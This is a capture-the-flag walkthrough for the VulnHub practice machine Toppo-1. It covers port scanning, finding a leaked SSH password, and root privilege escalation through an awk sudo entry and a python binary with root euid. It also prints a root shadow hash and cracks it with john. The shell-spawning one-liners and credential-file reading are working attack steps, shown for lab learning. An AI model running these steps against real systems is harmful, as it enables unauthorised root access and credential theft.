[Toppo-1](https://www.vulnhub.com/entry/toppo-1,245/) is quite trivial to exploit. Vulnhub description reads:

	The Machine isn't hard to own and don't require advanced exploitation .
	Level : Beginner
	DHCP : activated
	Inside the zip you will find a vmdk file , and I think you will be able to use it with any usual virtualization software ( tested with Virtualbox) .
	If you have any question : my twitter is @h4d3sw0rm
	Happy Hacking !

# Enumeration

Nmap provided the following info:

```bash
$ nmap -p- -T5 -sV 172.16.4.145
Starting Nmap 7.70 ( https://nmap.org ) at 2018-09-01 12:25 AEST
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
111/tcp   open  rpcbind 2-4 (RPC #100000)
45397/tcp open  status  1 (RPC #100024)
MAC Address: 00:0C:29:91:C8:2C (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Port 80 is running a blog based on Start Bootstrap:
![blog image](../../../images/post_toppo/port80.png)

Nikto pointed to /admin folder:
```bash
$ nikto -h 172.16.4.145
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          172.16.4.145
+ Target Hostname:    172.16.4.145
+ Target Port:        80
+ Start Time:         2018-09-01 12:27:45 (GMT10)
---------------------------------------------------------------------------
+ Server: Apache/2.4.10 (Debian)
+ Server leaks inodes via ETags, header found with file /, fields: 0x1925 0x563f5cf714e80 
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
+ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD 
+ OSVDB-3268: /admin/: Directory indexing found.
+ OSVDB-3092: /admin/: This might be interesting...
+ OSVDB-3268: /img/: Directory indexing found.
+ OSVDB-3092: /img/: This might be interesting...
+ OSVDB-3268: /mail/: Directory indexing found.
+ OSVDB-3092: /mail/: This might be interesting...
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /manual/images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7373 requests: 0 error(s) and 15 item(s) reported on remote host
+ End Time:           2018-09-01 12:27:54 (GMT10) (9 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

/admin has directory listing enabled with the only file notes.txt. Content of /admin/notes.txt is:

	Note to myself :
	I need to change my password :/ 12345ted123 is too outdated but the technology isn't my thing i prefer go fishing or watching soccer .

It is simple to guess form here that username can be `ted` with this password. SSHing provided a low level shell:
```
$ ssh ted@172.16.4.145
ted@172.16.4.145's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Apr 15 12:33:00 2018 from 192.168.0.29
ted@Toppo:~$ id
uid=1000(ted) gid=1000(ted) groups=1000(ted),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth)
```

# Privilege Escalation
Copied over PentestMonkey Privilege Escalation script using python SimpleHTTPServer module and wget. Running it failed because of missing dependency:
```
$ ./upc.sh standard
Assuming the OS is: linux
ERROR: Dependend program 'strings' is mising.  Can't run.  Sorry!
```

Running [linuxprivchecker.py](https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py) provided the following in the output:
```
$ python linuxprivchecker.py 

[+] Sudoers (privileged)
    ted ALL=(ALL) NOPASSWD: /usr/bin/awk

[+] Current User
    root

[+] Current User ID
    uid=1000(ted) gid=1000(ted) euid=0(root) groups=1000(ted),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth)

[!] ARE YOU SURE YOU'RE NOT ROOT ALREADY?
```

With euid of root, we already have root privileges and can easily get a privileged reverse shell:
```bash
ted@Toppo:~$ echo '__import__("os").system("id")' | python
uid=1000(ted) gid=1000(ted) euid=0(root) groups=1000(ted),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth)
ted@Toppo:~$ echo '__import__("os").system("whoami")' | python
root
ted@Toppo:~$ echo '__import__("os").system("cat /root/flag.txt")' | python
_________                                  
|  _   _  |                                 
|_/ | | \_|.--.   _ .--.   _ .--.    .--.   
    | |  / .'`\ \[ '/'`\ \[ '/'`\ \/ .'`\ \ 
   _| |_ | \__. | | \__/ | | \__/ || \__. | 
  |_____| '.__.'  | ;.__/  | ;.__/  '.__.'  
                 [__|     [__|              




Congratulations ! there is your flag : 0wnedlab{p4ssi0n_c0me_with_pract1ce}
```
## Alternately 1
/etc/sudoers has the following entry `ted ALL=(ALL) NOPASSWD: /usr/bin/awk` which allows ted to run awk as root. When we use bash to get root using awk it fails but sh still works:
```bash
ted@Toppo:~$ awk 'BEGIN {system("/bin/bash")}'
bash-4.3$ id
uid=1000(ted) gid=1000(ted) groups=1000(ted),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth)
bash-4.3$ awk 'BEGIN {system("/bin/sh")}'
# id
uid=1000(ted) gid=1000(ted) euid=0(root) groups=1000(ted),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth)
# whoami
root
```
## Alternately 2

The privilege escalation enumeration python script was able to read /etc/shadow with the entry for root to be:

`root:$6$5UK1sFDk$sf3zXJZ3pwGbvxaQ/1zjaT0iyvw36oltl8DhjTq9Bym0uf2UHdDdRU4KTzCkqqsmdS2cFz.MIgHS/bYsXmBjI0:17636:0:99999:7:::`

This can be cracked using john for bruteforce in a few seconds:

```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt pass
Warning: detected hash type "sha512crypt", but the string is also recognized as "crypt"
Use the "--format=crypt" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:05 0.03% (ETA: 20:50:21) 0g/s 815.5p/s 815.5c/s 815.5C/s Liverpool..tucker1
test123          (root)
1g 0:00:00:22 DONE (2018-09-02 15:35) 0.04488g/s 789.9p/s 789.9c/s 789.9C/s 111292..newcastle1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Dictionary based SSH bruteforce for this simple password would have also yielded a quick result.
